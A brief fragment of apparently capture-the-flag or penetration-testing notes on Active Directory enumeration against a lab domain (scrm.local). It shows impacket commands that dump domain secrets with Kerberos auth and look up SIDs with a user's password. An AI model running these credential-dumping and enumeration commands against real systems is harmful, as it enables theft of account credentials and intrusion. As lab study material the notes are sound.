
---
##### Kerberos Auth

"DRSCrackNames" will reveal the SID

We need to append the -500 at the end and we gained the Domain SID

```
impacket-secretsdump -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
```
##### Password Auth

```
impacket-lookupsid scrm.local/ksimpson:'ksimpson'@10.129.44.233
```